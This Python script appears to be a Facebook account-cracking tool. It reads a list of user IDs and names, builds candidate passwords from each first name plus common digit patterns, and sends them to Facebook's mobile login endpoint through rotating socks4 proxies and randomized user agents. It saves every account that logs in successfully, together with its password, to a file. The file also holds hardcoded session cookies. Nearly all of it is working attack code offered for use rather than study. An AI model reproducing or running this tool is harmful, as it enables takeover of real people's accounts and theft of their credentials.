# Modul
import hashlib
import requests
import sys
import platform
import time
import datetime
import sys
import time
import requests
import requests
import random
import platform
import datetime
import requests
import sys
import time
import base64
import subprocess
import hashlib
import requests
from concurrent.futures import ThreadPoolExecutor
import datetime  # Added for time calculation
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
import base64
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from urllib.parse import quote
import requests,bs4,json,os,sys,random,time,re
import urllib3,rich,base64
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64,uuid
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
#----------[ DATA-TIME ]----------#
from bs4 import BeautifulSoup as sop
import requests,bs4,json,os,sys,random,datetime,time,re
import requests
cookies = {
    'datr': 'iZ2xY04E3jAca46uaLOJLWbL',
    'sb': 'iZ2xYyI7oe2HAXvfOpqjNV2N',
    'locale': 'fa_IR',
    'vpd': 'v1%3B737x393x2.75',
    'wd': '393x737',
    'fr': '03qbkrBnVS1MbxzdF.AWWPF12j03FKAckquOtOJksxRdQ.BjsZ2J.Dd.AAA.0.0.BjtnKl.AWWZYuLXi94',
}

headers = {
    'authority': 'mbasic.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'fa-IR,fa;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    # 'cookie': 'datr=iZ2xY04E3jAca46uaLOJLWbL; sb=iZ2xYyI7oe2HAXvfOpqjNV2N; locale=fa_IR; vpd=v1%3B737x393x2.75; wd=393x737; fr=03qbkrBnVS1MbxzdF.AWWPF12j03FKAckquOtOJksxRdQ.BjsZ2J.Dd.AAA.0.0.BjtnKl.AWWZYuLXi94',
    'origin': 'https://mbasic.facebook.com',
    'referer': 'https://mbasic.facebook.com/',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 4.4.2; Nexus 4 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Mobile Safari/537.36',
}

params = {
    'refid': '8',
}

data = {
    'lsd': 'AVqAhQPrMiI',
    'jazoest': '2963',
    'uid': '100076526146833',
    'flow': 'login_no_pin',
    'next': '',
}

response = requests.post(
    'https://mbasic.facebook.com/login/device-based/validate-pin/',
    params=params,
    cookies=cookies,
    headers=headers,
    data=data,
)
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import time
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
pretty.install()
CON=sol()
#DATE AND TIME
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day


try:
    prox = requests.get('https://github.com/B51Fire1/proxy/blob/main/Proxy.txt').text
    open('.prox.txt','w').write(prox)
except Exception as e:
    pass
prox=open('.prox.txt','r').read().splitlines()

try: 
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox) 
except Exception as e:
	pass
prox=open('.prox.txt','r').read().splitlines()


#USER-AGENTS
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
for xd in range(10000):
        a='Mozilla/5.0 (Symbian/3; Series60/'
        b=random.randrange(1, 9)
        c=random.randrange(1, 9)
        d='Nokia'
        e=random.randrange(100, 9999)
        f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
        g=random.randrange(1, 9)
        h=random.randrange(1, 4)
        i=random.randrange(1, 4)
        j=random.randrange(1, 4)
        k='Mobile Safari/535.1'
        uaku1=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
        ugen.append(uaku1)


        aa='Mozilla/5.0 (Linux; U; Android'
        b=random.choice(['6','7','8','9','10','11','12'])
        c=' en-us; GT-'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)

        a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
        b=random.randrange(100, 9999)
        c=random.randrange(100, 9999)
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        h=random.randrange(1, 9)
        i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
        j=random.randrange(1, 9)
        k=random.randrange(1, 9)
        l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
        uaku3=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
        ugen2.append(uaku3)
#PROXYGEN


id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#COLOR-CODE
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;32m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,O,h,u,b])

okc = 'X-FILE-OK-'+str(ta)+'.txt'
cpc = 'X-FILE-CP-'+str(ta)+'.txt'

def clear():
    os.system('clear')
    banner()
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "\x1b[1;91mPM"
else:
    a = ltx
    tag = "\x1b[1;96mAM"
#IPYTHONI
def _____BRADOSTI_____(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.002)
def tahun(fx):
        if len(fx)==15:
                if fx[:10] in ['1000000000']       :tahunz = '2009'
                elif fx[:9] in ['100000000']       :tahunz = '2009'
                elif fx[:8] in ['10000000']        :tahunz = '2009'
                elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
                elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
                elif fx[:6] in ['100001']          :tahunz = '2010-2011'
                elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
                elif fx[:6] in ['100004']          :tahunz = '2012-2013'
                elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
                elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
                elif fx[:6] in ['100009']          :tahunz = '2015'
                elif fx[:5] in ['10001']           :tahunz = '2015-2016'
                elif fx[:5] in ['10002']           :tahunz = '2016-2017'
                elif fx[:5] in ['10003']           :tahunz = '2018'
                elif fx[:5] in ['10004']           :tahunz = '2019'
                elif fx[:5] in ['10005']           :tahunz = '2020'
                elif fx[:5] in ['10006','10007','10008','10009','100010','100011','100012']:tahunz = '2021-2022'
                else:tahunz=''
        elif len(fx) in [9,10]:
                tahunz = '2008-2009'
        elif len(fx)==8:
                tahunz = '2007-2008'
        elif len(fx)==7:
                tahunz = '2006-2007'
        else:tahunz=''
        return tahunz
def clear():
        os.system('clear')
def back():
        login()
#LOGO
def banner():
        print("""\033[1;32m
        



██████   █████  ██     ██  █████  
██   ██ ██   ██ ██     ██ ██   ██ 
██████  ███████ ██  █  ██ ███████ 
██   ██ ██   ██ ██ ███ ██ ██   ██ 
██   ██ ██   ██  ███ ███  ██   ██
                                   
                                 
              
     
__________________________________
TOOL BY RAWA🧠
NETWORK + 3G 4G 5G STORNG🥷
VERSION + 1.0.0.1🌼    """)
os.system('clear')
banner()
#MENU
def menu():

        print(f'\x1b[1;92m  1- CRACK BA FILE')
        _____BRADOSTI_____ = input('  SELECT : ')
        if _____BRADOSTI_____ in ['1']:
                F()
                print(' \x1b[1;91m\x1b[1;96m{H} LogOut Successful ')
                exit()
        else:
                print(' \x1b[1;91m\x1b[1;96m\x1b[1;91m NOT SELECT ')
                back()
def error():
        print(f' \x1b[1;91m\x1b[1;96m{H} \x1b[1;91mBgarewa Bo Menu')
        time.sleep(2)
        back()
#INPUT-FILE
def F():
    os.system('clear');
    D().plerr()
    

class D:
        def __init__(self):
                self.id = []
        def plerr(self):
                os.system("clear")
                banner()
                try:

                        fileX = input ('\033[1;33m FILE NAME : ')
                        for line in open(fileX, 'r').readlines():
                                id.append(line.strip())
                        print(f'\x1b[1;93mCOLECTED ID : \x1b[1;93m'+str(len(id)))
                        Settings()
                except IOError:
                        print(" \x1b[1;91m\x1b[1;96m{H} \x1b[1;91m file %s not found\x1b[0m"%(fileX));time.sleep(2)
                        F()
#SERVER-SETTING
def Settings():
        print('')
        print('\x1b[1;93m RANDOM IDS ')
        print('')
        hu = "1"
        if hu in ['2','02']:
                for tua in sorted(id):
                        id2.append(tua)

        elif hu in ['1','1']:
                muda=[]
                for bacot in sorted(id):
                        muda.append(bacot)
                bcm=len(muda)
                bcmi=(bcm-1)
                for xmud in range(bcm):
                        id2.append(muda[bcmi])
                        bcmi -=1
        elif hu in ['111','01']:
                for bacot in id:
                        xx = random.randint(0,len(id2))
                        id2.insert(xx,bacot)
        else:
                print('\x1b[1;91m\x1b[1;96m{H}\x1b[1;91mNOT HALBZHERA')
                exit()

        print('\x1b[1;93m METHODE MOBILE')
        print('')
        hc = "1"
        if hc in ['1','01']:
                method.append('mobile')
        else:
                method.append('mobile')
        pwplus= "t"
        if pwplus in ['00','00']:
                pwpluss.append('ya')
                cetak(nel('[[cyan]•[white]] ENTER 6 CHARECTERS FOR CRACK PASS\n[[cyan]•[white]] LIKE --->[green] zaxo123,kurd123,hama1234[white] '))
                pwku=input('\x1b[1;93m[\x1b[1;92m+\x1b[1;93m]\x1b[1;93m ╰─>\x1b[1;92mPassword > \x1b[1;93m')
                pwkuh=pwku.split(',')
                for xpw in pwkuh:
                        pwnya.append(xpw)
        else:
                pwpluss.append('no')
        BB()
        exit()
def BB():
    os.system('clear')
    banner()
    passwrd()
def passwrd():
        print(f"{H}"+30*"=")
        print(f"\x1b[1;32m 𝐑𝐎𝐘𝐀𝐋 {H}{ha}{H}/{H}{bu}{H}/{H}{ta} ")
        print(f"{H}"+30*"="+"\n")
        with tred(max_workers=30) as pool:
                for yuzong in id2:
                        idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
                        frs = nmf.split(' ')[0]
                        pwv = []
                        if len(nmf)<6:
                                if len(frs)<3:
                                        pass
                                else:
                                        pwv.append(frs+frs)
                                        pwv.append(frs+' '+frs)
                                        pwv.append(frs+"12")
                                        pwv.append(frs+"123")
                                        pwv.append(frs+"1234")
                                        pwv.append(frs+"12345")
                                        pwv.append(frs+"123456")
                                        pwv.append(frs+"1234567")
                                        pwv.append(frs+'12'+frs)
                                        pwv.append(frs+'123'+frs)
                                        pwv.append(frs+'12345'+frs)
                                        pwv.append(frs+'@123')
                                        pwv.append(frs+'@12345')
                                        pwv.append(frs+'123@')
                                        pwv.append(frs+'12345@')
                                        pwv.append(frs+'1221')
                                        pwv.append(frs+'123321')
                                        pwv.append(frs+'12344321')
                                        pwv.append(frs+'1234554321')
                        else:
                                if len(frs)<3:
                                        pwv.append(nmf)
                                else:
                                        pwv.append(frs+frs)
                                        pwv.append(frs+' '+frs)
                                        pwv.append(frs+"12")
                                        pwv.append(frs+"123")
                                        pwv.append(frs+"1234")
                                        pwv.append(frs+"12345")
                                        pwv.append(frs+"123456")
                                        pwv.append(frs+"1234567")
                                        pwv.append(frs+'12'+frs)
                                        pwv.append(frs+'123'+frs)
                                        pwv.append(frs+'12345'+frs)
                                        pwv.append(frs+'@123')
                                        pwv.append(frs+'@12345')
                                        pwv.append(frs+'123@')
                                        pwv.append(frs+'12345@')
                                        pwv.append(frs+'1221')
                                        pwv.append(frs+'123321')
                                        pwv.append(frs+'12344321')
                                        pwv.append(frs+'1234554321')
                        if 'ya' in pwpluss:
                                for xpwd in pwnya:
                                        pwv.append(xpwd)
                        else:pass
                        if 'mobile' in method:
                                pool.submit(crack,idf,pwv)
                        elif 'free' in method:
                                pool.submit(crackfree,idf,pwv)
                        elif 'touch' in method:
                                pool.submit(cracktouch,idf,pwv)
        print(f'\n{x}GOOD : {H}%s '%(ok))
        print(f'{x}CP : {m}%s '%(cp))
        print('Crack ( Y/t ) ? ')
        woi = input('{H} HALBZHERA  : ')
        if woi in ['y','Y']:
                back()
        else:
                print(f'\t \x1b[1;91m\x1b[1;96m{H} BYE {u} ')
                time.sleep(2)
                exit()

def crack(idf,pwv):
        global loop,ok,cp
        sys.stdout.write(f"\r\033[1;32m [ 𝐑𝐀𝐖𝐀 ]{P} [{H}{loop}{P}][{H}{len(id)}{P}] [{H}𝑂𝐾{m}${H}{ok}{P}]  "),
        sys.stdout.flush()
        #ua = random.choice(ugen)
        #ua2 = random.choice(ugen2)
        ses = requests.Session()
        for pw in pwv:
                try:
                        nip=random.choice(prox)
                        proxs= {'http': 'socks4://'+nip}
                        ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
                        p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
                        dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
                        koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
                        koki+=' m_pixel_ratio=2.625; wd=412x756'
                        heade = {'authority': 'm.facebook.com',
    'method': 'GET',
	'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'content-type':'application/x-www-form-urlencoded',
    'origin':'https://m.facebook.com',
    'referer': 'https://m.facebook.com/',
    'dpr': '2.75',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"Redmi Note 8 Pro"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"11.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': ua,
    'viewport-width': '980',
}
                        po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=headers,allow_redirects=False,proxies=proxs)
#                        if "checkpoint" in po.cookies.get_dict().keys():
                        if "c_user" in ses.cookies.get_dict().keys():
                                ok+=1
                                coki=po.cookies.get_dict()
                                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                                print(f'\r\033[1;32m [𝐑𝐀𝐖𝐀-𝑂𝐾] {idf} | {pw} ')
                                open('/sdcard/𝑅𝑂𝑌𝐴𝐿-𝑂𝐾.txt','a').write(idf+' | '+pw+'\n')
                                break
                        else:
                                continue
                except requests.exceptions.ConnectionError:
                        time.sleep(10)
        loop+=1
def chek():
    os.system('clear')
    banner()
    menu()

if __name__=='__main__':
        try:os.system('git pull')
        except:pass
        try:os.mkdir('OK')
        except:pass
        try:os.mkdir('CP')
        except:pass
        try:os.mkdir('/sdcard/X - FILE')
        except:pass
        try:os.system('touch .prox.txt')
        except:pass
        chek()
